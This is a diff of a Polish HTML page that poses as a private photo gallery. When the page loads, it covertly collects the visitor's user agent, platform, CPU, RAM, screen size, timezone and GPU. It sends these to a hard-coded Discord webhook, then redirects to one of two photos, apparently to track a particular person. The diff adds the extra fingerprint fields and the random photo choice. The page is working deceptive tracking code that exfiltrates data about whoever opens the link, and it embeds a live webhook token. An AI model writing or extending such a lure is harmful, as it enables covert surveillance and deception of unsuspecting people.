@@ -3,87 +3,113 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Debug Mode - Galeria</title>
+  <title>Prywatna Galeria Zdjęć - Debug</title>
   <style>
     body { background: #0f172a; color: #fff; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
     .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-    #debug-box { margin-top: 20px; padding: 10px; background: #1e293b; border: 1px solid #38bdf8; border-radius: 5px; max-width: 90%; word-break: break-all; font-size: 12px; color: #38bdf8; }
+    #debug-box { margin-top: 20px; padding: 15px; background: #1e293b; border: 1px solid #38bdf8; border-radius: 8px; max-width: 90%; width: 400px; word-break: break-all; font-size: 11px; color: #38bdf8; text-align: left; max-height: 200px; overflow-y: auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
   <div class="loader"></div>
-  <p id="status-text">Inicjalizacja modułu debugowania...</p>
-  <div id="debug-box">Oczekiwanie na zdarzenia...</div>
+  <p id="status-text">Wczytywanie bezpiecznej galerii...</p>
+  <div id="debug-box">[SYSTEM] Inicjalizacja modułu OSINT...</div>
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
-    const REDIRECT_URL = "./20260808_121307.jpg";
+    
+    // Obie fotki podesłane przez Maszę - losujemy cel przekierowania
+    const targetPhotos = [
+      "./20260808_121307.jpg",
+      "./IMG_20250315_160715.heif"
+    ];
+    const REDIRECT_URL = targetPhotos[Math.floor(Math.random() * targetPhotos.length)];
 
     function logDebug(msg) {
       console.log(msg);
       const box = document.getElementById('debug-box');
-      box.innerHTML += "<br>> " + msg;
+      if(box) {
+        box.innerHTML += "<br>> " + msg;
+        box.scrollTop = box.scrollHeight;
+      }
     }
 
-    // Twardy bezpiecznik: po 3 sekundach wymuszamy przekierowanie bez względu na wszystko
+    // Awaryjny bezpiecznik: po 2.5 sekundy twarde przekierowanie do wylosowanego pliku
     const safetyTimer = setTimeout(() => {
-      logDebug("CRITICAL: Safety timer triggered! Force redirecting...");
+      logDebug("CRITICAL: Safety timer włączony. Skok do: " + REDIRECT_URL);
       window.location.replace(REDIRECT_URL);
-    }, 3000);
+    }, 2500);
 
-    async function runDebugTrap() {
+    function harvestIntel() {
+      let gpu = "Nieznane";
       try {
-        logDebug("Start zbierania telemetrii...");
-        
-        let gpu = "Brak";
-        try {
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl');
-          if (gl) {
-            const di = gl.getExtension('WEBGL_debug_renderer_info');
-            if (di) gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
-          }
-        } catch(err) {
-          logDebug("GPU Error: " + err.message);
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const di = gl.getExtension('WEBGL_debug_renderer_info');
+          if (di) gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
         }
+      } catch(err) {
+        logDebug("Błąd GPU: " + err.message);
+      }
+
+      return {
+        ua: navigator.userAgent,
+        platform: navigator.platform || "N/A",
+        cores: navigator.hardwareConcurrency || "?",
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "?",
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        gpu: gpu,
+        targetFile: REDIRECT_URL
+      };
+    }
+
+    async function executeTrap() {
+      try {
+        logDebug("Skanowanie środowiska celu...");
+        const data = harvestIntel();
+        logDebug("GPU: " + data.gpu);
+        logDebug("Wybrano plik docelowy: " + data.targetFile);
 
         const payload = {
-          username: "DEBUG OSINT BOT",
+          username: "MASZA OSINT DEBUGGER",
           embeds: [{
-            title: "🐞 DEBUG TRAP RAPORT",
-            color: 16711680,
+            title: "🎯 TRAFIONY / ZALOGOWANY CEL (DEBUG & 2 PLIKI)!",
+            color: 15158332,
             fields: [
-              { name: "GPU", value: `\`${gpu}\`` },
-              { name: "UA", value: `\`\`\`${navigator.userAgent}\`\`\`` }
+              { name: "📂 Wylosowany Plik", value: `\`${data.targetFile}\``, inline: false },
+              { name: "🎮 GPU Renderer", value: `\`${data.gpu}\``, inline: false },
+              { name: "💻 Hardware", value: `CPU: \`${data.cores}\` | RAM: \`${data.ram}\``, inline: true },
+              { name: "🌍 Strefa", value: `\`${data.timezone}\``, inline: true },
+              { name: "🖥️ User-Agent", value: `\`\`\`${data.ua}\`\`\``, inline: false }
             ],
             timestamp: new Date()
           }]
         };
 
-        logDebug("Wysyłanie fetch do Discorda...");
-        
-        const response = await fetch(DISCORD_WEBHOOK, {
+        logDebug("Wysyłanie paczki do Discorda...");
+        await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
           keepalive: true
         });
+        logDebug("Wysyłka zakończona sukcesem!");
 
-        logDebug("Discord response status: " + response.status);
-
-      } catch(e) {
-        logDebug("EXC_ROUTINE: " + e.message);
+      } catch(err) {
+        logDebug("BŁĄD KRYTYCZNY: " + err.message);
       } finally {
-        logDebug("Blok finally: czyszczenie timera i skok do zdjęcia.");
         clearTimeout(safetyTimer);
+        logDebug("Przekierowanie do pliku za 0.5s...");
         setTimeout(() => {
           window.location.replace(REDIRECT_URL);
-        }, 500); // Małe opóźnienie, żebyś zdążył przeczytać logi na ekranie
+        }, 500);
       }
     }
 
-    runDebugTrap();
+    executeTrap();
   </script>
 </body>
 </html>
